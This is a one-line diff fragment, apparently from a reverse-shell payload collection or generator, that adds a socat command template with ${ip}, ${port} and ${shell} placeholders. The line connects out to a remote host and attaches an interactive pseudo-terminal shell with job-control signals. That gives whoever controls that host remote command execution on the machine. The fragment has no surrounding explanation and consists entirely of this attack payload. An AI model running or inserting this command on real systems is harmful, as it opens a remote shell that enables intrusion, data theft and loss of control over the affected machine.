@@ -1,0 +1,1 @@
+socat TCP:${ip}:${port} EXEC:'${shell}',pty,stderr,setsid,sigint,sane
